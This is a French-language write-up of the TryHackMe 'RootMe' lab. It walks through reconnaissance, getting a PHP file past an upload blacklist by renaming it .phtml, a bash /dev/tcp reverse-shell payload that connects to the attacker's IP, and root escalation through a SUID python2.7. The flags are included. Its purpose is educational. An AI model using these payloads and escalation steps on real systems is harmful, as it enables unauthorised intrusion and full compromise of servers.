---
title: "TryHackMe — RootMe : Writeup"
date: 2026-08-17 14:00:00 +0100
categories: [Room, TryHackMe]
tags: [web, file-upload, privesc, suid, linux]
description: "Résolution de la room RootMe sur TryHackMe : contournement de blacklist d'upload, reverse shell et privilège escalation via un binaire SUID Python."
---

> **Cible** : `10.129.135.83` 
**Difficulté** : Easy 
**Catégorie** : Web Exploitation → File Upload → Privesc SUID 
**Flags** : `user.txt` + `root.txt`

---

## 1. Reconnaissance Nmap

Première étape systématique : identifier les services exposés avant toute action.

```bash
nmap -sC -sV 10.129.135.83
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: HackIT - Home
```

**Pourquoi ces flags :** `-sC` lance les scripts NSE par défaut (bannières, infos de base), `-sV` détecte les versions de service  utile pour repérer une CVE connue si besoin.

**Lecture du résultat :** deux ports ouverts, SSH et HTTP. Pas de creds connus → SSH inexploitable pour l'instant. Le titre "HackIT - Home" suggère une appli web custom, donc surface d'attaque probable côté port 80.

---

## 2. Content discovery avec Gobuster

La page d'accueil ne révèle rien d'exploitable directement. On brute-force les répertoires/fichiers non liés publiquement.

```bash
gobuster dir -u http://10.129.135.83 -w /usr/share/wordlists/dirb/common.txt
```

```
/panel/               (Status: 200)
```

**Pourquoi cette wordlist :** `common.txt` de dirb est rapide et suffisante ici ; SecLists (`raft-small-directories.txt`) aurait donné plus de couverture mais pas nécessaire sur une room easy.

`/panel/` mène à un formulaire d'upload de fichier — signal fort : toute fonctionnalité d'upload mérite d'être testée pour un **Unrestricted File Upload** (OWASP Top 10).

**Test 1 — upload direct d'un `.php` :**

```
PHP não é permitido!
```

_(portugais : "PHP n'est pas autorisé")_ → confirme l'existence d'une **blacklist** côté serveur sur l'extension `.php`.

---

## 3. Bypass du filtre avec Burp Suite

**Pourquoi ça marche :** une blacklist ne bloque jamais que ce qu'elle connaît. Apache 2.4.41 sur Ubuntu interprète souvent comme du PHP exécutable d'autres extensions que `.php` — notamment `.phtml`, `.pht`, `.php3-7` — si le module PHP est configuré pour les gérer (comportement courant par défaut). Le serveur ne filtre que `.php` explicitement.

**Pourquoi Burp Suite :** la vérification se fait probablement côté client (JS) ou sur une extension déclarée dans la requête. Renommer le fichier localement ne suffit pas si on veut tester plusieurs variantes rapidement sans repasser par le navigateur à chaque fois.

- **Burp Proxy** intercepte la requête d'upload avant qu'elle parte.
- **Burp Repeater** permet de modifier et renvoyer la requête autant de fois que nécessaire.

**Requête modifiée** (extension `.phtml` au lieu de `.php`) :

```http
POST /panel/ HTTP/1.1
Host: 10.129.135.83
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryztcFFiR4SG2dAG8s

------WebKitFormBoundaryztcFFiR4SG2dAG8s
Content-Disposition: form-data; name="fileUpload"; filename="shell.phtml"
Content-Type: application/x-php

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.156.117/4444 0>&1'");
?>
------WebKitFormBoundaryztcFFiR4SG2dAG8s
```

```
O arquivo foi upado com sucesso!
Veja! → ../uploads/shell.phtml
```

Le serveur accepte le fichier **et révèle directement son chemin public** dans la réponse, pas besoin de brute-forcer le dossier d'upload avec ffuf/gobuster ici.

---

## 4. Reverse shell : obtenir l'exécution de code

**Le payload PHP :**

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.156.117/4444 0>&1'");
?>
```

**Décomposition :**
- `exec()` : exécute une commande shell côté serveur.
- `/dev/tcp/IP/PORT` : fonctionnalité native bash pour ouvrir une connexion TCP comme un fichier — aucune dépendance externe type `nc` requise côté cible.
- `bash -i` : shell interactif.
- `>& ... 0>&1` : redirige stdin/stdout/stderr vers la socket réseau, donc tout ce qui se passe dans ce bash transite par la connexion.

**Listener côté attaquant :**

```bash
nc -lvnp 4444
```

`-l` écoute, `-v` verbeux, `-n` pas de résolution DNS, `-p` port d'écoute.

**Déclenchement** : visite de `http://10.129.135.83/uploads/shell.phtml` dans le navigateur → le PHP s'exécute côté serveur → connexion retour :

```
connect to [192.168.156.117] from (UNKNOWN) [10.129.135.83] 40304
bash: cannot set terminal process group (794): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-129-135-83:/var/www/html/uploads$
```

Shell obtenu en tant que **www-data** (utilisateur système d'Apache) — comportement attendu : le process PHP hérite des droits du serveur web, jamais de root directement.

---

## 5. Stabilisation du shell

Un reverse shell brut via `/dev/tcp` n'est pas un vrai TTY : pas d'autocomplétion, `Ctrl+C` tue la session, pas d'édition de ligne — d'où le `no job control in this shell`.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Le module `pty` spawn un vrai bash lié à un pseudo-terminal → flèches, historique, `Ctrl+C` utilisable sur les sous-process sans tuer la session.

---

## 6. Flag user.txt

Énumération manuelle du système de fichiers :

```bash
find / -name "user.txt" 2>/dev/null
```

```
/var/www/user.txt
```

```bash
cat /var/www/user.txt
```

```
THM{y0u_g0t_a_sh3ll}
```

Fichier en `-rw-r--r--`, lisible directement par `www-data` → aucune escalade nécessaire pour ce flag.

---

## 7. Recherche des binaires SUID

**Rappel :** un binaire avec le bit **SUID** actif s'exécute avec les droits de son propriétaire, peu importe qui le lance. Si un binaire appartenant à root a le SUID actif et permet indirectement d'exécuter des commandes arbitraires, un utilisateur non privilégié peut l'utiliser pour obtenir un shell root.

```bash
find / -perm -4000 -type f 2>/dev/null
```

- `-perm -4000` : filtre les fichiers ayant le bit SUID (`4000` en octal).
- `-type f` : uniquement des fichiers réguliers.
- `2>/dev/null` : masque les erreurs "Permission denied".

Parmi la liste (majoritairement des SUID légitimes : `passwd`, `sudo`, `su`, `chsh`...), un élément anormal :

```
/usr/bin/python2.7
```

**Pourquoi c'est anormal :** `python2.7` n'a aucune raison légitime d'avoir le SUID actif, ce n'est pas un comportement par défaut sur Ubuntu → mauvaise configuration volontaire du lab, exactement le genre de faille recherchée en CTF.

```bash
ls -l /usr/bin/python2.7
```

```
-rwsr-xr-x 1 root root 3657904 Dec  9  2024 /usr/bin/python2.7
```

Le `s` à la place du `x` confirme le SUID, fichier appartenant à `root`.

---

## 8. Exploitation du SUID Python et élévation à root

Puisque `python2.7` avec SUID actif exécute du code Python avec les droits root, on force explicitement l'UID effectif à 0 avant de spawn un shell :

```bash
/usr/bin/python2.7 -c 'import os, pty; os.setuid(0); pty.spawn("/bin/bash")'
```

**Décomposition :**
- `os.setuid(0)` : demande de changer l'UID effectif vers 0 (root). Un utilisateur normal ne peut pas faire ça, mais comme le binaire tourne déjà avec les droits root grâce au SUID, l'appel réussit.
- `pty.spawn("/bin/bash")` : lance un bash complet héritant de cet UID root.

```
root@ip-10-129-135-83:/var/www#
```

Le prompt passe de `www-data@` à `root@` — escalade réussie. C'est exactement la logique documentée sur **GTFOBins** pour les interpréteurs (Python, Perl, Ruby...) avec SUID.

**Confirmation :**

```bash
sudo -l
```

```
User root may run the following commands on ip-10-129-135-83:
    (ALL : ALL) ALL
```

---

## 9. Flag root.txt

```bash
find / -name "root.txt" 2>/dev/null
```

```
/root/root.txt
```

```bash
cat /root/root.txt
```

```
THM{pr1v1l3g3_3sc4l4t10n}
```

Machine complètement compromise : accès initial (www-data) → SUID Python → root.

---




|Étape|Technique|Concept clé|
|---|---|---|
|Recon|`nmap -sC -sV`|Découverte de services|
|Content discovery|`gobuster dir`|Brute-force de répertoires cachés (`/panel/`)|
|Bypass upload|Burp Proxy/Repeater|Blacklist d'extension incomplète (`.phtml`)|
|RCE|`exec()` PHP + `/dev/tcp`|Reverse shell|
|Stabilisation|`pty.spawn`|TTY interactif complet|
|Privesc|`find -perm -4000` + `os.setuid(0)`|Binaire SUID mal configuré|

---

## 10. Points d'apprentissage clés

1. **Une blacklist d'extensions n'est presque jamais suffisante** : ici seule `.php` était filtrée, mais Apache interprète aussi `.phtml`, `.pht`, `.php3-7`, etc. selon sa configuration. Une whitelist stricte aurait empêché cette attaque.
2. **Burp Repeater** est l'outil de choix pour itérer rapidement sur des variantes d'une requête (extension, header `Content-Type`) sans repasser par l'interface web à chaque essai.
3. **`/dev/tcp/IP/PORT`** est une fonctionnalité bash native très utilisée pour les reverse shells légers, sans dépendance externe comme `nc` côté cible.
4. **Un SUID mal placé sur un interpréteur** (Python, Perl, awk, find...) est presque toujours exploitable pour une élévation de privilèges immédiate, c'est une des premières choses à vérifier en post-exploitation, avec **GTFOBins** comme référence.
5. **La méthodologie reste la même à chaque étape** : recon → identification de la surface d'attaque → exploitation → stabilisation → énumération post-exploitation → privesc → flag.

---

_Writeup rédigé à partir d'un test réalisé sur la room TryHackMe "RootMe", environnement légal et dédié à l'apprentissage._
